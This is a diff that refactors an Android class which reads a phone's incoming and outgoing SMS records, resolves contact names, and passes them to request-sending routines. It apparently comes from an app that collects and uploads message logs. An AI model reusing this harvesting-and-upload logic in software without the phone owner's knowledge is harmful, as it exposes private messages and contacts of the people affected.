@@ -12,6 +12,7 @@ import android.os.AsyncTask;
 import android.preference.PreferenceManager;
 import android.provider.ContactsContract.PhoneLookup;
 
+import com.inet.android.request.ConstantRequest;
 import com.inet.android.request.RequestList;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
@@ -23,10 +24,9 @@ import com.inet.android.utils.Logging;
  * 
  */
 public class ListSms extends AsyncTask<Context, Void, Void> {
-	Context mContext;
+	private Context mContext;
 	private String LOG_TAG = ListSms.class.getSimpleName().toString();
 	private String complete;
-	private String iType = "2";;
 	private String version;
 
 	public void getSmsLogs() {
@@ -52,16 +52,16 @@ public class ListSms extends AsyncTask<Context, Void, Void> {
 					for (int i = 0; i < sms_sent_cursor.getCount(); i++) {
 						int typeSms = sms_sent_cursor.getInt(sms_sent_cursor
 								.getColumnIndex("type"));
-						String type = "0";
+						int type = -1;
 						switch (typeSms) {
 						case 1:
-							type = "5";
+							type = ConstantRequest.TYPE_INCOMING_SMS_REQUEST;
 							break;
 						case 2:
-							type = "6";
+							type = ConstantRequest.TYPE_OUTGOING_SMS_REQUEST;
 							break;
 						default:
-							type = "7";
+							type = 7;
 							break;
 						}
 						try {
@@ -125,7 +125,7 @@ public class ListSms extends AsyncTask<Context, Void, Void> {
 	}
 
 	private void endList() {
-		TurnSendList.setList(iType, version, "0", mContext);
+		TurnSendList.setList(ConstantRequest.TYPE_LIST_SMS_REQUEST, version, "0", mContext);
 	}
 
 	private void lastRaw(String sendStr) {
@@ -135,7 +135,7 @@ public class ListSms extends AsyncTask<Context, Void, Void> {
 	}
 
 	private void sendRequest(String str, String complete) {
-		RequestList.sendDemandRequest(str, iType, complete, version, mContext);
+		RequestList.sendDemandRequest(str, ConstantRequest.TYPE_LIST_SMS_REQUEST, complete, version, mContext);
 	}
 
 	private String getContactName(Context context, String phoneNumber) {
